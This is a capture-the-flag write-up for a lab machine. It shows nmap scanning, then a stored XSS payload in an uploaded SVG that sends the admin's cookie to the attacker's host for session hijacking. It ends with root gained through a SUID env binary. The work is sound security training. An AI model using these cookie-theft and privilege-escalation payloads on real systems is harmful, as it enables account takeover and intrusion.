![Screenshot](/medium/SocialHub/Images/machine.png)

Difficulty: **medium**

Made by: **El pinguino de mario**

# Steps to pwn 🥽

* 👁️  [Reconnaissance](#reconnaissance)
* 🪓 [Exploitation](#exploitation)
* 🚩 [Privilege Escalation](#privilege-escalation)

---

First of all we make sure the machine is up, we can do this with the command **ping**.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil/socialhub]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.280 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.291 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.092 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2017ms
rtt min/avg/max/mdev = 0.092/0.221/0.291/0.091 ms
```

Now we can start the **reconnaissance** phase.

---
# Reconnaissance

We start our reconnaissance with **nmap**, to know what ports are open in the target.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/socialhub/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 17:26 -05
Initiating ARP Ping Scan at 17:26
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 17:26, 0.21s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:26
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 5000/tcp on 172.17.0.2
Completed SYN Stealth Scan at 17:26, 3.49s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000024s latency).
Scanned at 2025-12-02 17:26:19 -05 for 4s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
5000/tcp open  upnp    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.18 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.

**-n** <- With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.

**-sS** <- With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.

**--min-rate 5000** <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.

**-Pn** <- With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.

**-vv** <- With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues.

**--open** <- With this argument we are telling to nmap to only filter the open ports.

Once the scan concludes we can see 2 ports open:

- port 22 (ssh / secure shell)
- port 5000 *(upnp?)*

We can make another scan with **nmap** to know more about these 2 ports.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/socialhub/enumeration]
└─$ nmap -p22,5000 -sCV 172.17.0.2 -oX target --stats-every=1m
```

**-p22,5000** <- With this argument nmap will only scan this 2 ports that we discover.

**-sCV** <- With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports.

**-oX target** <- With this argument we save all the output that nmap give us and save it as a xml file.

**--stats-every=1m** <- With this argument we receive stats of the scan every 1 minute, this can have minutes (m) and seconds (s)

After the scan finish we got the output in a xml file, we do this to make a html page to see the information more easily and pretty to look at.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/socialhub/enumeration]
└─$ xsltproc target -o target.html
```

With this command we convert the xml file to a html file, now let's open it.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/socialhub/enumeration]
└─$ open target.html 
```

And we can see this:

![Screenshot](/medium/SocialHub/Images/image1.png)

As we can see here it's more pretty and also more readable.

And we got that the port 5000 is a website, let's take a look with our browser.

![Screenshot](/medium/SocialHub/Images/image2.png)

We can see this, and also a hint that this website is vulnerable to **stored XSS** through a file **SVG**.

But first let's make an account.

![Screenshot](/medium/SocialHub/Images/image3.png)

We can see when we login, it show us another hint, it seems the user **admin** in a time checks our profile. So we need to upload a SVG file with a script XSS inside of it.

So let's change our profile picture, to upload a SVG file.

![Screenshot](/medium/SocialHub/Images/image4.png)

Okay now it's obvious that we can upload this type of file, first I am going to make a script that shows a window alert.

```html
<svg>
<body xmlns="http://www.w3.org/1999/xhtml">
<script>
alert("funny :3")
</script>
</body>  
</svg>
```

Okay so when we upload this we can see a window alert on the website.

![Screenshot](/medium/SocialHub/Images/image5.png)

And we got a exploit to do some **cookie hijacking** to the admin, and taking advantage that the admin check our profile.

---
# Exploitation

But first we make sure that the user admin can really see our profile, let's modify our SVG file.

```html
<svg>
<body xmlns="http://www.w3.org/1999/xhtml">
<script src="http://192.168.0.20/pwned.js">
</script>
</body>  
</svg>
```

When any user see out profile, automatically we are going to receive a GET request to our attack machine. Let's see if it works.

But first we make a python server to receive any request to us.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/socialhub/exploits]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Okay so now let's upload now our SVG file.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/socialhub/exploits]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.0.20 - - [02/Dec/2025 17:55:08] code 404, message File not found
192.168.0.20 - - [02/Dec/2025 17:55:08] "GET /pwned.js HTTP/1.1" 404 -
172.17.0.2 - - [02/Dec/2025 17:55:26] code 404, message File not found
172.17.0.2 - - [02/Dec/2025 17:55:26] "GET /pwned.js HTTP/1.1" 404 -
```

And the user admin can see our profile! The IP of the target machine is **172.17.0.2** so we can now steal the cookie of the user admin.

So let's change once again our SVG file.

```html
<svg>
<body xmlns="http://www.w3.org/1999/xhtml">
<script>
const request = new XMLHttpRequest()
request.open("GET", "http://192.168.0.20/?cookie=" + document.cookie, false)
request.send()
</script>
</body>
</svg>
```

So with this payload, we are going to make a http request to our attack machine, and sending the cookie of the user that are seeing our profile.

So let's once again up our server.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/socialhub/exploits]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now let's upload our innocent SVG file :)

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/socialhub/exploits]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.0.20 - - [02/Dec/2025 18:05:52] "GET /?cookie=session=eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6ImNyYWZ0In0.aS9wzw.R1m-YlISpyQMqiXj9vF5TyTik3E HTTP/1.1" 200 -
172.17.0.2 - - [02/Dec/2025 18:06:02] "GET /?cookie=session=[REDACTED] HTTP/1.1" 200 -
```

So we got our own cookie, but also of the user admin!

Okay so let's copy the cookie of the user admin and change it our own replacing it.

![Screenshot](/medium/SocialHub/Images/image6.png)

So once we change it and reload the website and we can be as the user admin!

![Screenshot](/medium/SocialHub/Images/image7.png)

So we got the credentials to login with ssh!

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/socialhub/exploits]
└─$ ssh hijacking@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:OgRuemYuNpIReVs1Znz61rFzVgvIlRlziYOz6TNRRcU
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
hijacking@172.17.0.2's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.16.8+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

hijacking@8eae3778d9c7:~$
```

---
# Privilege Escalation

We can see if exists any SUID on the system

```
hijacking@8eae3778d9c7:~$ find / -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/env
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/sudo
```

We can see here that the command **env** have a permission **SUID**, this means that we can escalate our privileges!

What does the command **env?**, In summary we can execute any command in the system, and the owner of the command **env** is the user **root**.

```
hijacking@8eae3778d9c7:~$ /usr/bin/env bash -p
```

With this command we are executing a **bash as privileged** this means that we are going to launch a new shell as the proprietary of the command **bash** (**root**)

```
hijacking@8eae3778d9c7:~$ /usr/bin/env bash -p
bash-5.1# cat /root/root.txt 
🚩 ¡FELICIDADES! Has completado el laboratorio y eres ROOT.
Flag: {SUID_ENV_PRIVESC_SUCCESS}
```

Now we are root ***...pwned..!***
